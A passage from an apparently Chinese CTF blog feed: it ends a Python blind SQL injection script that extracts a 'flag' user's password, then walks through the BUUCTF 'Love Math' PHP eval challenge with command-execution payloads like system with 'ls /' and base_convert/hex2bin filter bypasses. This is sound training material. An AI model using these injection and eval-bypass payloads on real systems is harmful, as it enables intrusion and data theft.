手动指定要查看多少列数据，由于合在一起显示所以只有一列</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnum存储每个字段数据的字符个数</span><br><span class="hljs-comment"># 手动指定要查看多少字符数据</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先遍历该字段有多少列</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># data用来字段该列的数据</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            payload3 = <span class="hljs-string">&quot;1^(ascii(substr((select(password)from(&#123;&#125;)where(username=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload3)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;字段第&#123;&#125;列的值:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">password字段第1列的值:flag&#123;0ca992a6-fc81-43d7-8419-deba5dea5107&#125;<br></code></pre></td></tr></table></figure><p>flag &#x3D; flag{0ca992a6-fc81-43d7-8419-deba5dea5107}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN 2019 初赛]Love Math 题解</title>
    <link href="/2023/08/24/2023-08-24-Love%20Math/"/>
    <url>/2023/08/24/2023-08-24-Love%20Math/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>1.打开网页发现是PHP代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>2.代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-comment">//isset函数用于判断该变量是否为null,如果为null返回flase</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-comment">//将GET方法获取的内容传输给变量content</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-comment">//判断输入的内容长度是否&gt;=80</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//设置黑名单数据:空格,\t,\r,&#x27;,&quot;,`,[,]</span><br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<span class="hljs-comment">//遍历黑名单数据</span><br>        <span class="hljs-comment">//正则表达式/m表示多行匹配</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-comment">//设置可以被允许使用的函数名单</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-comment">//$used_funcs用于存储匹配到的字符串</span><br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>); <br>    <span class="hljs-comment">//$used_funcs[0]:表示数组used_funcs的起始地址，使func从数组第一个开始取，直到最后一个 </span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<span class="hljs-comment">//遍历匹配到的字符串</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-comment">//匹配到的字符串如果不存在于白名单中</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//有危险函数执行，可以通过$content=system(&quot;ls /&quot;)执行恶意代码</span><br>&#125; <br></code></pre></td></tr></table></figure><p>函数介绍:<br><strong>issert:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">用于判断变量的内容是否为空，如果为null,则返回false<br></code></pre></td></tr></table></figure><p><strong>show_source(filename,return)</strong>:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">show_source() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。<br><br>用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。<br><br>show_source() 是 highlight_file() 的别名。<br><br>注释：当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824101642383.png" alt="image-20230824101642383"></p><p><strong>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] ):</strong><br><img src="/images/2023-8-24_LoveMath/image-20230824102848164.png" alt="image-20230824102848164"></p><p><strong>in_array(search,array,type)</strong></p><p><img src="/images/2023-8-24_LoveMath/image-20230824104747383.png" alt="image-20230824104747383"></p><p>3.分析:<br><strong>由于我们需要利用最后eval()函数执行恶意代码，所以最后content的值应该为:</strong><br><strong>system(“ls &#x2F;“)</strong></p><p>测试代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;system(&quot;dir&quot;)&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//发生函数执行</span><br></code></pre></td></tr></table></figure><p>输出:<br><img src="/images/2023-8-24_LoveMath/image-20230824105712830.png" alt="image-20230824105712830"></p><p>而content的值又是GET(‘c’)进行获取</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=system(&quot;ls /&quot;)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824105855231.png" alt="image-20230824105855231"></p><p>这是因为我们输入的内容中含有黑名单字符:”,空格</p><p><strong>在PHP代码中没有””命令依然可以被执行:</strong><br>测试:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;system(dir)&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//发生函数执行</span><br></code></pre></td></tr></table></figure><p>输出:<br><img src="/images/2023-8-24_LoveMath/image-20230824110120472.png" alt="image-20230824110120472"></p><p><strong>由于eval()可以执行正确语法的PHP代码，所以我们可以在eval()中构造一个PHP代码,即用变量保存函数和参数:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">eval(echo $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]));<br></code></pre></td></tr></table></figure><p>所以最后构造的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;])&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p><strong>GET()函数中也可以不需要单引号’’,并且[]可以使用{}代替</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;a&#125;($_GET&#123;b&#125;)&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>&#123;a&#125;(<span class="hljs-variable">$_GET</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=system&amp;b=dir <br></code></pre></td></tr></table></figure><p>输出:</p><p><img src="/images/2023-8-24_LoveMath/image-20230824130556447.png" alt="image-20230824130556447"></p><p>在题目的网页中输入后显示:<br>![image-20230824130738728](images&#x2F;2023-8-24_Love Math&#x2F;image-20230824130738728.png)</p><p>这时已经绕过第一层判断，来到第二层判断:</p><p>4.对第二层判断进行绕过:</p><p><strong>函数介绍:</strong><br><strong>base_convert()函数(属于数学函数):</strong><br><img src="/images/2023-8-24_LoveMath/image-20230824131254523.png" alt="image-20230824131254523"></p><h5 id="hex2bin-String-函数（属于字符串函数）"><a href="#hex2bin-String-函数（属于字符串函数）" class="headerlink" title="hex2bin(String) 函数（属于字符串函数）:"></a><strong>hex2bin(String) 函数（属于字符串函数）:</strong></h5><p><img src="/images/2023-8-24_LoveMath/image-20230824131526831.png" alt="image-20230824131526831"></p><h5 id="dechex-函数（属于数学函数）"><a href="#dechex-函数（属于数学函数）" class="headerlink" title="dechex() 函数（属于数学函数）:"></a><strong>dechex() 函数（属于数学函数）:</strong></h5><p><img src="/images/2023-8-24_LoveMath/image-20230824131746347.png" alt="image-20230824131746347"></p><p>现在的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;a&#125;($_GET&#123;b&#125;)&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p>由于函数:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);<br></code></pre></td></tr></table></figure><p>对该正则表达式的解释:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*:<br>表示第一个字符是以a-z或A-Z或_或不可见字符中的一个，第二个字符是a-z或A-Z或_或数字或不可见字符中的一个<br>且第二个字符的情况可以出现0次或多次(符合PHP对变量名的要求):<br>实例:<br>a9oo9<br>Aa99o<br>_GET<br>不可见字符9oooa<br><br>所以数字开头的字符串不会被匹配<br></code></pre></td></tr></table></figure><p>所以提取的是content字符串中所有的单词，所以最终content会被提取成:GET,a,b</p><p><strong>这些单词都不包含在白名单中，所以要将这些单词进行替换(内部函数名可以被用作是参数名)a&#x3D;&gt;abs,b&#x3D;&gt;atan,GET由于是要函数执行，所以无法被替换:</strong><br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;abs&#125;($_GET&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p>我们可以利用数学函数对$_GET进行转码</p><p><strong>36进制介绍(同理17-35进制，就是少了一些字母):</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">三十六进制，是数据的一种表示方法。同我们日常生活中的表示法不一样。它由0-9，A-Z组成，字母不区分大小写。与10进制的对应关系是：0-9对应0-9；A-Z对应10-35<br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs txt">//35=&gt;z<br>print(base_convert(35,10,36).&quot;\n&quot;);<br><br>//37=36+1=&gt;36^1*1+36^0*1=&gt;11<br>print(base_convert(37,10,36).&quot;\n&quot;);<br><br>//9=&gt;9<br>print(base_convert(9,10,36).&quot;\n&quot;);<br><br>//70=&gt;36+34=&gt;36^1*1+36^0*34=&gt;1y<br>print(base_convert(70,10,36).&quot;\n&quot;);<br><br>输出:<br>z<br>11<br>9<br>1y<br></code></pre></td></tr></table></figure><p>我们可以发现通过十进制转36进制可以被0-9和a-z的字符进行表示输出36进制字符串，所以我们可以构造一个特定的十进制值使其被转化为36进制时刚好是字符串函数hex2bin:</p><p>将36进制(36进制包含所有非特殊字符，可以用于表示所有不含特殊字符的函数)hex2bin转化为10进制:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;hex2bin&quot;</span>,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>).<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-comment">//37907361743</span><br></code></pre></td></tr></table></figure><p>由于$_GET函数含有特殊字符，所以必须使用hex2bin将16进制转化为ASCII码的形式进行代换</p><p><strong>将字符串转化为16进制:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">s = <span class="hljs-string">&quot;_GET&quot;</span><br>s_hex = <span class="hljs-string">&quot;&quot;</span><br><span 